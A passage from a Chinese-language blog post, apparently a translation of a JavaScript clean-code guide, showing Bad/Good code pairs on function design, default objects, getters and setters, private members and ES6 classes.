class="headerlink" title="Good:"></a>Good:</h6><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">function</span> <span class="selector-tag">createMenu</span>(&#123; <span class="selector-tag">title</span>, <span class="selector-tag">body</span>, <span class="selector-tag">buttonText</span>, <span class="selector-tag">cancellable</span> &#125;) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">createMenu</span>(&#123;</span><br><span class="line">  <span class="attribute">title</span>: <span class="string">&quot;Foo&quot;</span>,</span><br><span class="line">  <span class="attribute">body</span>: <span class="string">&quot;Bar&quot;</span>,</span><br><span class="line">  <span class="attribute">buttonText</span>: <span class="string">&quot;Baz&quot;</span>,</span><br><span class="line">  <span class="attribute">cancellable</span>: true</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li><h4 id="一个函数应该只做一件事"><a href="#一个函数应该只做一件事" class="headerlink" title="一个函数应该只做一件事"></a>一个函数应该只做一件事</h4></li></ul><p><strong>Bad:</strong></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function <span class="built_in">emailClients</span>(clients) &#123;</span><br><span class="line">  clients<span class="selector-class">.forEach</span>(client =&gt; &#123;</span><br><span class="line">    const clientRecord = database.lookup(client);</span><br><span class="line">    if (clientRecord.isActive()) &#123;</span><br><span class="line">      <span class="built_in">email</span>(client);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Good:</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> email<span class="constructor">ActiveClients(<span class="params">clients</span>)</span> &#123;</span><br><span class="line">  clients.filter(isActiveClient).<span class="keyword">for</span><span class="constructor">Each(<span class="params">email</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> is<span class="constructor">ActiveClient(<span class="params">client</span>)</span> &#123;</span><br><span class="line">  const clientRecord = database.lookup(client);</span><br><span class="line">  return clientRecord.is<span class="constructor">Active()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><h4 id="函数的名字就是她做的事"><a href="#函数的名字就是她做的事" class="headerlink" title="函数的名字就是她做的事"></a>函数的名字就是她做的事</h4></li></ul><p><strong>Bad:</strong></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function <span class="built_in">emailClients</span>(clients) &#123;</span><br><span class="line">  clients<span class="selector-class">.forEach</span>(client =&gt; &#123;</span><br><span class="line">    const clientRecord = database.lookup(client);</span><br><span class="line">    if (clientRecord.isActive()) &#123;</span><br><span class="line">      <span class="built_in">email</span>(client);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Good:</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> email<span class="constructor">ActiveClients(<span class="params">clients</span>)</span> &#123;</span><br><span class="line">  clients.filter(isActiveClient).<span class="keyword">for</span><span class="constructor">Each(<span class="params">email</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> is<span class="constructor">ActiveClient(<span class="params">client</span>)</span> &#123;</span><br><span class="line">  const clientRecord = database.lookup(client);</span><br><span class="line">  return clientRecord.is<span class="constructor">Active()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><h4 id="删除重复的代码（提升代码的复用性）"><a href="#删除重复的代码（提升代码的复用性）" class="headerlink" title="删除重复的代码（提升代码的复用性）"></a>删除重复的代码（提升代码的复用性）</h4></li></ul><p><strong>Bad:</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">showDeveloperList</span>(<span class="params">developers</span>) &#123;</span><br><span class="line">  developers.<span class="title function_">forEach</span>(<span class="function"><span class="params">developer</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> expectedSalary = developer.<span class="title function_">calculateExpectedSalary</span>();</span><br><span class="line">    <span class="keyword">const</span> experience = developer.<span class="title function_">getExperience</span>();</span><br><span class="line">    <span class="keyword">const</span> githubLink = developer.<span class="title function_">getGithubLink</span>();</span><br><span class="line">    <span class="keyword">const</span> data = &#123;</span><br><span class="line">      expectedSalary,</span><br><span class="line">      experience,</span><br><span class="line">      githubLink</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">render</span>(data);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showManagerList</span>(<span class="params">managers</span>) &#123;</span><br><span class="line">  managers.<span class="title function_">forEach</span>(<span class="function"><span class="params">manager</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> expectedSalary = manager.<span class="title function_">calculateExpectedSalary</span>();</span><br><span class="line">    <span class="keyword">const</span> experience = manager.<span class="title function_">getExperience</span>();</span><br><span class="line">    <span class="keyword">const</span> portfolio = manager.<span class="title function_">getMBAProjects</span>();</span><br><span class="line">    <span class="keyword">const</span> data = &#123;</span><br><span class="line">      expectedSalary,</span><br><span class="line">      experience,</span><br><span class="line">      portfolio</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">render</span>(data);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Good:</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">showEmployeeList</span>(<span class="params">employees</span>) &#123;</span><br><span class="line">  employees.<span class="title function_">forEach</span>(<span class="function"><span class="params">employee</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> expectedSalary = employee.<span class="title function_">calculateExpectedSalary</span>();</span><br><span class="line">    <span class="keyword">const</span> experience = employee.<span class="title function_">getExperience</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> data = &#123;</span><br><span class="line">      expectedSalary,</span><br><span class="line">      experience</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (employee.<span class="property">type</span>) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;manager&quot;</span>:</span><br><span class="line">        data.<span class="property">portfolio</span> = employee.<span class="title function_">getMBAProjects</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;developer&quot;</span>:</span><br><span class="line">        data.<span class="property">githubLink</span> = employee.<span class="title function_">getGithubLink</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">render</span>(data);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><h4 id="使用Object-assign来设置对象的默认值"><a href="#使用Object-assign来设置对象的默认值" class="headerlink" title="使用Object.assign来设置对象的默认值"></a>使用<code>Object.assign</code>来设置对象的默认值</h4></li></ul><p><strong>Bad:</strong></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> menuConfig = &#123;</span><br><span class="line">  title: null,</span><br><span class="line">  body: <span class="string">&quot;Bar&quot;</span>,</span><br><span class="line">  buttonText: null,</span><br><span class="line">  cancellable: <span class="literal">true</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">function <span class="title">createMenu</span><span class="params">(config)</span> </span>&#123;</span><br><span class="line">  config.title = config.title || <span class="string">&quot;Foo&quot;</span>;</span><br><span class="line">  config.body = config.body || <span class="string">&quot;Bar&quot;</span>;</span><br><span class="line">  config.buttonText = config.buttonText || <span class="string">&quot;Baz&quot;</span>;</span><br><span class="line">  config.cancellable =</span><br><span class="line">    config.cancellable !== undefined ? config.cancellable : <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">createMenu</span>(menuConfig);</span><br></pre></td></tr></table></figure><p><strong>Good:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">menuConfig</span> = &#123;</span><br><span class="line">  title: <span class="string">&quot;Order&quot;</span>,</span><br><span class="line">  <span class="comment">// User did not include &#x27;body&#x27; key</span></span><br><span class="line">  buttonText: <span class="string">&quot;Send&quot;</span>,</span><br><span class="line">  cancellable: <span class="literal">true</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createMenu</span>(<span class="params">config</span>) </span>&#123;</span><br><span class="line">  config = Object.<span class="title function_ invoke__">assign</span>(</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">title</span>: <span class="string">&quot;Foo&quot;</span>,</span><br><span class="line">      <span class="attr">body</span>: <span class="string">&quot;Bar&quot;</span>,</span><br><span class="line">      <span class="attr">buttonText</span>: <span class="string">&quot;Baz&quot;</span>,</span><br><span class="line">      <span class="attr">cancellable</span>: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    config</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// config now equals: &#123;title: &quot;Order&quot;, body: &quot;Bar&quot;, buttonText: &quot;Send&quot;, cancellable: true&#125;</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">createMenu</span>(menuConfig);</span><br></pre></td></tr></table></figure><ul><li><h4 id="封装条件"><a href="#封装条件" class="headerlink" title="封装条件"></a>封装条件</h4></li></ul><p><strong>Bad:</strong></p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (fsm.<span class="keyword">state</span> === <span class="string">&quot;fetching&quot;</span> &amp;&amp; isEmpty(listNode)) &#123;</span><br><span class="line">  // ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Good:</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> should<span class="constructor">ShowSpinner(<span class="params">fsm</span>, <span class="params">listNode</span>)</span> &#123;</span><br><span class="line">  return fsm.state<span class="operator"> === </span><span class="string">&quot;fetching&quot;</span><span class="operator"> &amp;&amp; </span>is<span class="constructor">Empty(<span class="params">listNode</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (should<span class="constructor">ShowSpinner(<span class="params">fsmInstance</span>, <span class="params">listNodeInstance</span>)</span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><h4 id="不需要过度优化"><a href="#不需要过度优化" class="headerlink" title="不需要过度优化"></a>不需要过度优化</h4></li></ul><p><strong>Bad:</strong></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// On old browsers, each iteration with uncached `list.length` would be costly</span></span><br><span class="line"><span class="comment">// because of `list.length` recomputation. In modern browsers, this is optimized.</span></span><br><span class="line"><span class="keyword">for</span> (let i = <span class="number">0</span>, len = list.<span class="built_in">length</span>; i &lt; len; i++) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Good:</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for <span class="params">(let <span class="attr">i</span> = 0; i &lt; list.length; i++)</span> &#123;</span><br><span class="line">  <span class="string">//</span> <span class="string">...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><h4 id="删除废弃的代码"><a href="#删除废弃的代码" class="headerlink" title="删除废弃的代码"></a>删除废弃的代码</h4></li></ul><p><strong>Bad:</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> old<span class="constructor">RequestModule(<span class="params">url</span>)</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="keyword">new</span><span class="constructor">RequestModule(<span class="params">url</span>)</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const req = newRequestModule;</span><br><span class="line">inventory<span class="constructor">Tracker(<span class="string">&quot;apples&quot;</span>, <span class="params">req</span>, <span class="string">&quot;www.inventory-awesome.io&quot;</span>)</span>;</span><br></pre></td></tr></table></figure><p><strong>Good:</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="keyword">new</span><span class="constructor">RequestModule(<span class="params">url</span>)</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const req = newRequestModule;</span><br><span class="line">inventory<span class="constructor">Tracker(<span class="string">&quot;apples&quot;</span>, <span class="params">req</span>, <span class="string">&quot;www.inventory-awesome.io&quot;</span>)</span>;</span><br></pre></td></tr></table></figure><h1 id="对象和数据结构"><a href="#对象和数据结构" class="headerlink" title="对象和数据结构"></a>对象和数据结构</h1><ul><li><h4 id="使用-getter-和-setter"><a href="#使用-getter-和-setter" class="headerlink" title="使用 getter 和 setter"></a>使用 getter 和 setter</h4></li></ul><p><strong>Bad:</strong></p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">makeBankAccount</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    balance: <span class="number">0</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> account = makeBankAccount();</span><br><span class="line">account.balance = <span class="number">100</span>;</span><br></pre></td></tr></table></figure><p><strong>Good:</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">makeBankAccount</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// this one is private</span></span><br><span class="line">  <span class="keyword">let</span> balance = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// a &quot;getter&quot;, made public via the returned object below</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">getBalance</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> balance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// a &quot;setter&quot;, made public via the returned object below</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">setBalance</span>(<span class="params">amount</span>) &#123;</span><br><span class="line">    <span class="comment">// ... validate before updating the balance</span></span><br><span class="line">    balance = amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    getBalance,</span><br><span class="line">    setBalance</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> account = <span class="title function_">makeBankAccount</span>();</span><br><span class="line">account.<span class="title function_">setBalance</span>(<span class="number">100</span>);</span><br></pre></td></tr></table></figure><ul><li><h4 id="使对象具有私有成员"><a href="#使对象具有私有成员" class="headerlink" title="使对象具有私有成员"></a>使对象具有私有成员</h4></li></ul><p><strong>Bad:</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Employee</span> = <span class="keyword">function</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Employee</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">getName</span> = <span class="keyword">function</span> <span class="title function_">getName</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">name</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> employee = <span class="keyword">new</span> <span class="title class_">Employee</span>(<span class="string">&quot;John Doe&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Employee name: <span class="subst">$&#123;employee.getName()&#125;</span>`</span>); <span class="comment">// Employee name: John Doe</span></span><br><span class="line"><span class="keyword">delete</span> employee.<span class="property">name</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Employee name: <span class="subst">$&#123;employee.getName()&#125;</span>`</span>); <span class="comment">// Employee name: undefined</span></span><br></pre></td></tr></table></figure><p><strong>Good:</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">makeEmployee</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="title function_">getName</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> employee = <span class="title function_">makeEmployee</span>(<span class="string">&quot;John Doe&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Employee name: <span class="subst">$&#123;employee.getName()&#125;</span>`</span>); <span class="comment">// Employee name: John Doe</span></span><br><span class="line"><span class="keyword">delete</span> employee.<span class="property">name</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Employee name: <span class="subst">$&#123;employee.getName()&#125;</span>`</span>); <span class="comment">// Employee name: John Doe</span></span><br></pre></td></tr></table></figure><blockquote><p>这里我觉得用原型链也不错，存在疑惑。</p></blockquote><ul><li><h4 id="使用class"><a href="#使用class" class="headerlink" title="使用class"></a>使用class</h4></li></ul><p><strong>Bad:</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Animal</span> = <span class="keyword">function</span>(<span class="params">age</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!(<span class="variable language_">this</span> <span class="keyword">instanceof</span> <span class="title class_">Animal</span>)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Instantiate Animal with `new`&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">move</span> = <span class="keyword">function</span> <span class="title function_">move</span>(<span class="params"></span>) &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Mammal</span> = <span class="keyword">function</span>(<span class="params">age, furColor</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!(<span class="variable language_">this</span> <span class="keyword">instanceof</span> <span class="title class_">Mammal</span>)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Instantiate Mammal with `new`&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title class_">Animal</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, age);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">furColor</span> = furColor;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Mammal</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"><span class="title class_">Mammal</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">Mammal</span>;</span><br><span class="line"><span class="title class_">Mammal</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">liveBirth</span> = <span class="keyword">function</span> <span class="title function_">liveBirth</span>(<span class="params"></span>) &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Human</span> = <span class="keyword">function</span>(<span class="params">age, furColor, languageSpoken</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!(<span class="variable language_">this</span> <span class="keyword">instanceof</span> <span class="title class_">Human</span>)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Instantiate Human with `new`&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title class_">Mammal</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, age, furColor);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">languageSpoken</span> = languageSpoken;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Human</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="title class_">Mammal</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"><span class="title class_">Human</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">Human</span>;</span><br><span class="line"><span class="title class_">Human</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">speak</span> = <span class="keyword">function</span> <span class="title function_">speak</span>(<span class="params"></span>) &#123;&#125;;</span><br></pre></td></tr></table></figure><p><strong>Good:</strong></p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">  constructor(age) &#123;</span><br><span class="line">    <span class="keyword">this</span>.age = age;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  move() &#123;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mammal</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">  constructor(age, furColor) &#123;</span><br><span class="line">    <span class="keyword">super</span>(age);</span><br><span class="line">    <span class="keyword">this</span>.furColor = furColor;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  liveBirth() &#123;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">  &#125;</span><br><span 